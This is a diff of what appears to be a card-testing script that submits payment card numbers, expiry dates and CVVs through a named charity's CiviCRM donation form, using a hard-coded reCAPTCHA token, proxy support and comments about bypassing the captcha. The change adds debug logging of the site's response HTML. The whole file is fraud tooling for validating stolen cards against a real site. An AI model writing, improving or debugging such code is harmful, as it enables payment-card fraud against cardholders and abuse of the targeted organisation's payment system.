@@ -293,7 +293,6 @@ def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, amoun
     final_payload["g-recaptcha-response"] = "0cAFcWeA4PqJOMFj5mWJD9PmhlqErXn7af22ptYqSm9PWIfUuWBD4CuqXOChTMG-uxogsiJFzY-zd9ZErdAp8mAMgGVa491KAT417HoBZftbG2aTzzIuzJAYLSzxNXPrDmt8nWhuGeMt66_-KgexQ5WcpNrAQXaUofULifI4N05Xu-aGCbF1BvuU6AQKLs8j_muWRkHZQVYplfzk5PPirHB8en_yuWaKIMceUyBJaF1KcvjAf6dHyu48kaDHdHhoor16NdbkzRS0G6EoFhQm1ktHTFEDkkiFkVS5LWx7BK_MeaaZUpIzjOIAMHL3rX_1M-PwJjAxT_LbQ9sYjVoI_m_8sAKjdRoiHAzgZdyBdytGY9OJEVAUukVHGRU6tO15M9lYYhA5VzK4nD0dWeCfIk15U3TcAwZgdAcV036TnwfZMFfC636oW7SgQ0Q76xPLGYNxYI0JT3TR8nHnW-sqmXk8pZQ-3wR3Zy056eCjt-qyR9a-1hRmvcO-O9OvBPQpoEnT_0kNxXtEjAtbCvYz2iitwZoMX4iA7krPUGYUhku9VEQdyNkR_IW5S-DUypInmpqVy1DR0g7iGE4GccDpimMUHlr9VThWRDLS_mpBvRAVuOsjH7RaahI2xoXWZyIHQ0he2nsI-q-0hdJ_O5UVr1rPzWCYvEGu9ufhE6AhIMz1XKnO5mxHppZ6oCMzAW7jwPgwf4VBSJjWB4ym_YriAPEmq4su1ehRc21xtl03WlPLZyAqIwmSzNc5O6biV-bMVa7BQuBGZOILy4X3qQ-0O0byiscz729xXIN30L4hR5rv7zMP-WctzXSvLxkk9dWS2mpaD3msoBXZP4Ac6SkGf_TvG3YlOOEjfgTNnTT86tVhC11Ni9PXwl9m2kolOe7v_PmMhmgN-jE3IjxFWHxpCfN9_MfQk-jYJQ2s05tgXlPz4kh_4R6AWuuIozqsdIPI676qsiqkKFiQptp_NxaARq3KndEd4eS5Vh8GYEmgBBaE6o_KrWQRTG-E5WuA1X0CcpPLBk6RvroZdQGy9kwInxFEF9u9h4J3ja7tWqOqrnomaGzjC7AM3KoJvE3wXpU6EW_JLHUbXNSDfkjdDWMzM9bfiZ5NsWYnDQtXzHBYYtv6KVD-ziCCwAkG84RUBjLscQkJCe7Wn-Dujhe9W34cw6Sw8eeFroIEPAs_hsnJQabopNAWRNKnK49wYsVkrmV31D3OxGFNuQfFPR-PLzeIYb4yhAuwVehhGeOAFsp0RSVQssODPW6ncHgBXuL5hakVTl9ehyjIcaB6E5QzLrPFjIjGAMRUmaEzWzpO4R5Oq2S0CZZA-QxNInQjvH54iwT5BKbjdZYXY6xA2"
 
     if is_confirm:
-        # BETUL 100% MCM PAYLOAD YANG AWAK BG
         final_payload["qfKey"] = new_qfkey if new_qfkey else qfkey
         final_payload["entryURL"] = "https://www.saharaaa.org/civicrm/contribute/transact/?reset=1&amp;id=1"
         final_payload["email_work"] = ""
@@ -359,12 +358,17 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
                 if '?' in post_url: post_url += f'&qfKey={qfkey}'
                 else: post_url += f'?qfKey={qfkey}'
 
-            # GUNA DATA= SUPAYA APPLICATION/X-WWW-FORM-URLENCODED DIGUNA PAKAI (BYPASS CAPTCHA)
             response = session.post(post_url, data=clean_initial, timeout=TIMEOUT_SECONDS + 2, allow_redirects=True)
 
             soup_resp = BeautifulSoup(response.text, 'html.parser')
             
             logging.info(f"URL Selepas Submit Pertama: {response.url}")
+            
+            # PRINT HTML CONTENT SUPAYA KITA BOLEH TENGOK SALAH MANA
+            logging.info("="*50)
+            logging.info("HTML CONTENT SELEPAS SUBMIT PERTAMA:")
+            logging.info(response.text[:5000]) # Print 5000 karakter pertama
+            logging.info("="*50)
             
             # CARI FORM CONFIRM YANG BETUL
             confirm_form = soup_resp.find('form', {'id': 'Confirm'})
